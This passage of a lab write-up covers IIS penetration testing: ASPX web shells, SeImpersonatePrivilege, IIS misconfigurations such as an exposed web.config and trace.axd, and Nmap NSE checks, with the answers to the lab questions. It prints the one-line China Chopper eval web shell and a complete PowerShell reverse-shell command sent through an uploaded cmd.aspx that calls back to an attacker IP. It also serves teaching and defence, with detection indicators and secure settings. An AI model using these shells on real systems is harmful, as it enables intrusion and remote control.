This privilege has historically been involved in Windows privilege-escalation techniques.

The lab specifically discusses tools such as Potato-style attacks in this context.

The important learning point is:
````
ASPX Shell
    ↓
IIS Application Pool Identity
    ↓
SeImpersonatePrivilege
    ↓
Potential privilege-escalation path
````


#### Application Pool Identity

The IIS application normally runs under an application-pool account.

For example:
````
iis apppool\defaultapppool
````
This account is intentionally more restricted than Administrator.

Think of it as:
````
SYSTEM
  │
  ├── Very high privilege
  │
Administrator
  │
  ├── High privilege
  │
IIS Application Pool
  │
  └── Restricted web application identity
````
Therefore, getting an ASPX shell does not automatically mean you have full control of Windows.



### China Chopper: What Real-World ASPX Shells Look Like

**MITRE  ATT&CK**: https://attack.mitre.org/techniques/T1505/003/

**China Chopper** is a historically important example of an ASPX web shell.

Its server-side component can be extremely small.

The lab shows a tiny ASPX/JScript example:
````
<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
````
The important concept is:
````
HTTP request
     │
     ▼
chopper parameter
     │
     ▼
eval()
     │
     ▼
Server-side execution
````
This is dangerous because the server-side component is very small while the attacker can send commands through HTTP.

How Defenders Can Detect ASPX Web Shells



### How Defenders Can Detect ASPX Web Shells

| Indicator                                  | Why suspicious                                    |
| ------------------------------------------ | ------------------------------------------------- |
| Unexpected `.aspx` file                    | May be a web shell                                |
| `.aspx` in upload directory                | Upload directory normally shouldn't execute code  |
| `eval()` / `execute()`                     | Can indicate dynamic code execution               |
| `Process.Start()`                          | Can execute Windows processes                     |
| Suspicious `cmd` parameters                | Possible command execution                        |
| Unusual POST requests                      | Web shells commonly receive commands through HTTP |
| IIS worker spawning `cmd.exe` / PowerShell | Strong behavioral indicator                       |



---

### Questions & Answers:


#### 1. After triggering the ASPX shell, what user account is returned by the whoami command? (Answer Format: lowercase, e.g., nt authority\system)
````
iis apppool\defaultapppool
````
<img width="466" height="107" alt="image" src="https://github.com/user-attachments/assets/a938807c-0bef-4c7e-aa28-fa9460bbee32" />


````
iis apppool\defaultapppool
````
<img width="1691" height="146" alt="image" src="https://github.com/user-attachments/assets/5007f85f-1341-441c-a061-e0696b88b357" />


---

#### 2. What Windows privilege, visible in whoami /priv output from the reverse shell, enables Potato-style privilege escalation from an IIS shell?
````
curl -G "http://10.49.166.153/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.49.119.172'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
````
````
whoami /priv
````
<img width="769" height="302" alt="image" src="https://github.com/user-attachments/assets/25d2303f-f820-4c71-b8c7-3e7b781e8cf2" />


Now we see:
````
SeImpersonatePrivilege
````
<img width="1685" height="152" alt="image" src="https://github.com/user-attachments/assets/87010c91-9107-4440-8959-3feed1ca9dee" />


----



## Task 6: IIS Misconfigurations

This task is about finding **IIS configuration mistakes** that can expose files, allow unwanted HTTP methods, leak application information, or give the web application excessive privileges.

### Misconfiguration 1: Directory Listing Enabled

#### What It Is

When IIS has no default document such as ``index.html`` or ``default.aspx``, but **Directory Browsing** is enabled, IIS can display the contents of a directory.

Check a directory with:
````
curl http://TARGET/uploads/
````

Example:
````
curl http://10.49.166.153/uploads/
````
<img width="1832" height="206" alt="image" src="https://github.com/user-attachments/assets/b5a0f7e1-0144-40cf-bd6d-523edaa4b855" />


Or we can open in browser: http://10.49.166.153/uploads/

<img width="1294" height="307" alt="image" src="https://github.com/user-attachments/assets/402b20a3-473e-4da6-99a5-b7a03e0227d9" />



#### Why It Matters

An attacker may discover:
````
.bak
.config
.log
.zip
.sql
````
These files may contain passwords, source code, database information, or backups.

Investigation Flow
````
/uploads/
    ↓
Directory listing
    ↓
Find interesting files
    ↓
Download/read files
    ↓
Look for sensitive information
````



### Misconfiguration 2: HTTP PUT and DELETE Without Authentication


#### What It Is

The ``OPTIONS`` method tells us which HTTP methods the server accepts.

Run:
````
curl -X OPTIONS http://10.49.166.153/ -sv 2>&1 | grep "Allow:"
````
<img width="1265" height="174" alt="image" src="https://github.com/user-attachments/assets/5cef587c-572f-47e9-a825-3804e6311bfc" />

| Method      | Meaning                  | What you found           |
| ----------- | ------------------------ | ------------------------ |
| `GET`       | Download/read resource   | Normal                   |
| `POST`      | Submit data              | Normal                   |
| `OPTIONS`   | Show supported methods   | Normal                   |
| `TRACE`     | Diagnostic request       | ⚠️ Enabled               |
| `DELETE`    | Delete resource          | ⚠️ Potentially dangerous |
| `COPY`      | Copy WebDAV resource     | WebDAV enabled           |
| `MOVE`      | Move WebDAV resource     | WebDAV enabled           |
| `PROPFIND`  | List WebDAV properties   | WebDAV enabled           |
| `PROPPATCH` | Modify WebDAV properties | WebDAV enabled           |
| `MKCOL`     | Create WebDAV collection | WebDAV enabled           |
| `LOCK`      | Lock WebDAV resource     | WebDAV enabled           |
| `UNLOCK`    | Unlock WebDAV resource   | WebDAV enabled           |


#### Why It Matters

``PUT`` can potentially allow an unauthenticated user to upload a file.

``DELETE`` can potentially allow an unauthenticated user to remove a file.

Think of it as:
````
OPTIONS
   ↓
Check Allow header
   ↓
PUT present?
   ├── Yes → Test whether writing is permitted
   └── No
       
DELETE present?
   ├── Yes → Test whether deletion is permitted
   └── No
````

* But in this it show only `DELETE`.

### Misconfiguration 3: web.config Exposure

#### What Is web.config?

``web.config`` is an important ASP.NET configuration file.

It can contain things such as:
- Database connection strings
- API keys
- SMTP credentials
- Encryption settings
- Application configuration

Normally IIS should prevent direct downloading of this file.

Test:
````
curl http://10.49.166.153/web.config
````
<img width="1505" height="743" alt="image" src="https://github.com/user-attachments/assets/a7455371-af0d-4a22-a7dc-b5f9d3e08bf6" />


Secure vs Misconfigured

````
Secure
GET /web.config
      ↓
404 / blocked

Misconfigured
GET /web.config
      ↓
200 OK
      ↓
<configuration>
...
</configuration>
````
A ``200 OK`` response containing the XML configuration is a serious information-disclosure finding.




### Misconfiguration 4: Verbose Error Messages


#### What It Is

A badly configured ASP.NET application may return a detailed error/stack trace when something goes wrong.

For example, an error may reveal:
````
C:\inetpub\wwwroot\App\Controllers\AccountController.cs
````
It can also reveal:
- Internal file paths
- .NET version
- Database queries
- Application structure
- Internal IP addresses


#### Secure Configuration

The lab shows:
````
<system.web>
    <customErrors mode="On" />
</system.web>
````
This causes users to receive a generic error instead of the full stack trace.

Investigation Flow
````
Trigger application error
        ↓
HTTP 500
        ↓
Generic error?
   ├── Yes → Good
   └── No
        ↓
Full stack trace exposed
        ↓
Information disclosure
````


### Misconfiguration 5: trace.axd Left Enabled

#### What Is trace.axd?

``ASP.NET`` includes a diagnostic tracing system.

If it is exposed, try:
````
curl http://10.49.166.153/trace.axd
````
<img width="1127" height="994" alt="image" src="https://github.com/user-attachments/assets/57ffbfe5-1195-48af-bca2-b7d01ac98761" />


A successful ``200 OK`` response showing the trace viewer indicates that it is accessible.


Or we can open in browser: http://10.49.166.153/trace.axd

<img width="1919" height="768" alt="image" src="https://github.com/user-attachments/assets/9e51b151-8ce6-491e-ba3e-b946f6973a8e" />


And in this we can see detail about request:

<img width="1919" height="1025" alt="image" src="https://github.com/user-attachments/assets/bee37fc6-910f-40ba-873c-b453e59d88a8" />


#### Why It Matters

The trace information can contain details such as:
````
Request information
Session information
Cookies
Timing information
Application details
````
In particular, sensitive session information may become exposed.

#### Secure Configuration

The lab recommends disabling tracing:
````
<trace enabled="false" />
````



### Misconfiguration 6: TRACE Method Enabled
#### What Is TRACE?

``TRACE`` is an HTTP method originally intended for diagnostic purposes.

Check whether it is enabled:
````
curl -X TRACE http://10.49.166.153/ -sv
````
<img width="1900" height="959" alt="image" src="https://github.com/user-attachments/assets/e1c608f8-d71b-4383-8c75-0b550e652c30" />


A vulnerable configuration may return:
````
HTTP/1.1 200 OK
````
and echo your request.

A correctly restricted server should normally return:
````
405 Method Not Allowed
````


Flow
````
TRACE request
     ↓
Server
     ↓
405 → disabled/restricted
     │
     └── 200 + echoed request → TRACE enabled
````

The lab notes that modern browsers generally block TRACE, so this is primarily a configuration-hygiene finding rather than automatically a practical browser attack.



### Misconfiguration 7: Application Pool Running as a Privileged Account

#### What Is an Application Pool?

IIS applications run inside an application pool.

Normally the application pool should use a restricted identity such as:
````
IIS APPPOOL\DefaultAppPool
````
Check the identity from the ASPX shell:
````
curl "http://10.49.166.153/webdav/cmd.aspx?cmd=whoami"
````
<img width="709" height="163" alt="image" src="https://github.com/user-attachments/assets/2774f0d6-2ae3-42d1-a955-01f1db08e52f" />


Secure Example
````
iis apppool\defaultapppool
````


This is a relatively restricted identity.

Dangerous Example
````
nt authority\system
````
or:
````
administrator
````
or a highly privileged domain account.

If the web application runs directly as a highly privileged account, compromising the web application can immediately provide that level of access.


---


### Questions & Answers:

#### 1. Navigate to the /uploads/ directory on the target. What sensitive file extension is visible in the directory listing? (Answer Format: include the dot, e.g., .bak)
````
curl http://10.49.166.153/uploads/
````
<img width="1856" height="212" alt="image" src="https://github.com/user-attachments/assets/129be613-d2b9-467c-bade-490455e008b1" />


Now we see:
````
.bak
````
<img width="1287" height="116" alt="image" src="https://github.com/user-attachments/assets/1419ba34-4df9-432b-bf23-189d9f60c7b8" />


---


#### 2. What ASP.NET diagnostic handler URL path should be disabled in production as it can expose session data, cookies, and request history?

````
curl http://10.49.166.153/trace.axd
````
Or in browser:
````
http://10.49.166.153/trace.axd
````
<img width="1919" height="834" alt="image" src="https://github.com/user-attachments/assets/83401bdb-eee0-4f59-8dff-25364af7dab0" />


Now we see:
````
trace.axd
````
<img width="1278" height="105" alt="image" src="https://github.com/user-attachments/assets/5023e5b7-7d2f-4538-8201-399ad5492af8" />


----




## Task 7: Automation

This section shows how to use Nmap NSE scripts to automate the IIS/WebDAV checks you previously performed manually with ``curl``.

### NSE Scripts for IIS

| Script                 | What it checks                                 |
| ---------------------- | ---------------------------------------------- |
| `http-methods`         | Finds allowed HTTP methods using `OPTIONS`     |
| `http-webdav-scan`     | Detects WebDAV and shows DAV methods           |
| `http-iis-webdav-vuln` | Checks for specific IIS WebDAV vulnerabilities |
| `http-ntlm-info`       | Extracts information from an NTLM challenge    |


#### The main idea:
````
Manual testing
     │
     ├── curl OPTIONS
     ├── curl WebDAV
     ├── check NTLM
     └── identify IIS
           │
           ▼
      Nmap NSE
           │
           ▼
      Automate checks
````



### Service Version Detection

First identify what is running on port 80:
````
nmap -sV -p 80 10.49.166.153
````
<img width="1158" height="306" alt="image" src="https://github.com/user-attachments/assets/fa22558f-30ce-499a-b8fa-60f043b0d3ef" />


| Output                     | Meaning                      |
| -------------------------- | ---------------------------- |
| `80/tcp`                   | HTTP is listening on port 80 |
| `open`                     | Port is accessible           |
| `http`                     | Nmap identifies HTTP         |
| `Microsoft IIS httpd 10.0` | IIS 10.0 was detected        |



### Enumerating HTTP Methods

````
nmap --script http-methods -p 80 10.49.166.153
````
<img width="1352" height="327" alt="image" src="https://github.com/user-attachments/assets/848d785a-204e-4606-9743-70340c7dfe23" />


| Finding       | Meaning                                   |
| ------------- | ----------------------------------------- |
| `PUT`         | Server may allow uploading files          |
| `DELETE`      | Files may potentially be deleted          |
| `MOVE`        | Resources may potentially be moved        |
| `COPY`        | Resources may potentially be copied       |
| `PROPFIND`    | WebDAV directory/resource enumeration     |
| `MKCOL`       | Can potentially create WebDAV directories |
| `LOCK/UNLOCK` | WebDAV locking operations                 |
| `OPTIONS`     | Reveals supported HTTP methods            |



### Detecting WebDAV
````
nmap --script http-webdav-scan -p 80 10.49.166.153
````
<img width="1445" height="403" alt="image" src="https://github.com/user-attachments/assets/74e31c14-26e2-45aa-8543-5a5e876df61d" />


The important WebDAV methods include:
| Method      | Purpose                               |
| ----------- | ------------------------------------- |
| `PROPFIND`  | Retrieves WebDAV resource information |
| `PROPPATCH` | Changes resource properties           |
| `MKCOL`     | Creates a collection/directory        |
| `PUT`       | Uploads/replaces a resource           |
| `DELETE`    | Deletes a resource                    |
| `COPY`      | Copies a resource                     |
| `MOVE`      | Moves a resource                      |
| `LOCK`      | Locks a resource                      |
| `UNLOCK`    | Removes a lock                        |

Therefore, the presence of these methods is strong evidence that WebDAV is enabled.


### Identifying NTLM Authentication
````
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.49.166.153
````
<img width="1357" height="437" alt="image" src="https://github.com/user-attachments/assets/579fca83-9ccd-43cf-9c49-7f50c92172c4" />



Or in this we use this:
````
nmap --script http-ntlm-info  -p 80 10.49.166.153
````
<img width="864" height="454" alt="image" src="https://github.com/user-attachments/assets/857572bb-0b2e-4199-bc60-e97d4352d1c3" />


In this we see the result is the same.

````
nmap -sV --script http-methods,http-webdav-scan,http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.49.166.153
````
<img width="1741" height="716" alt="image" src="https://github.com/user-attachments/assets/c5a4bd7c-27e9-481a-a987-6f0cea854c89" />


In this we see detail.

---

### Question & Answer

#### 1. What nmap NSE script enumerates allowed HTTP methods on a web server?
````
http-methods
````
<img width="1875" height="245" alt="image" src="https://github.com/user-attachments/assets/05feac5f-e66b-4ff4-9612-96e434db3622" />


----


## Task 8: Conclusion 


### Key Takeaways

|  # | Key Takeaway                 | Simple Explanation                                                                                                              |
| -: | ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
|  1 | **IIS Fingerprinting**       | Identify the IIS version and enabled features before testing further.                                                           |
|  2 | **8.3 Tilde Enumeration**    | The `~` technique can reveal hidden files/directories that normal wordlists may miss.                                           |
|  3 | **WebDAV Shell Upload**      | A successful upload requires **WebDAV + write permission + Script Execute** on the target directory.                            |
|  4 | **PUT/MOVE Behavior**        | IIS handler mappings are applied when the request is processed, which can affect how uploaded files are handled.                |
|  5 | **ASPX Web Shell**           | An ASPX shell runs under the IIS **Application Pool identity**, not automatically as Administrator.                             |
|  6 | **`SeImpersonatePrivilege`** | The default IIS application identity may have this privilege, which is important when assessing potential privilege escalation. |
|  7 | **Directory Listing**        | Exposed directory listings can reveal files, backups, configuration files, and other sensitive resources.                       |
|  8 | **Unauthenticated WebDAV**   | WebDAV exposed without proper authentication can create unauthorized file-operation risks.                                      |
|  9 | **`web.config` Exposure**    | Exposing `web.config` can disclose sensitive application configuration and potentially credentials.                             |
| 10 | **`trace.axd` Exposure**     | An accessible ASP.NET trace page can disclose request history, paths, framework information, and other application details.     |
| 11 | **CVE Not Always Required**  | Misconfiguration alone can create a security finding even when there is no specific CVE.                                        |


---

### Question & Answer:

<img width="1508" height="209" alt="image" src="https://github.com/user-attachments/assets/db443106-9793-4f25-948a-a473d6362b85" />


----



### Now we completed the RooM:

<img width="1348" height="753" alt="image" src="https://github.com/user-attachments/assets/9a819350-7d30-4493-a504-537a0b5a328d" />



----
